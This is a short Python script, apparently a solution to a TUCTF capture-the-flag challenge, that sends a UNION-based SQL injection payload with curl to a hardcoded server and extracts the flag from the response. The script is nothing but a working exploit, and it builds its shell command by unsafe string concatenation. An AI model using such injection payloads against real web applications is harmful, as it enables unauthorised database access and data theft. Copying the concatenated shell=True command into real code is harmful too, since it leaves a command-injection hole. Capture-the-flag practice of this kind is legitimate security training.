#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-13 18:28:47
# @Last Modified by:   john
# @Last Modified time: 2016-05-13 19:22:48

from subprocess import *

from re import findall

url = 'http://104.199.151.39/postQuery.php'

name = "' UNION SELECT * FROM tuctf_info; #+7eb586e9dbf680aa28a887c9d71322ee"

command = 'curl "'+url+'" --data "name='+name+'&submit=1"'
p = Popen(command.strip(), shell=True, stdout = PIPE, stderr=PIPE)

output = p.stdout.read()
print findall("TUCTF\{.*\}", output)[0]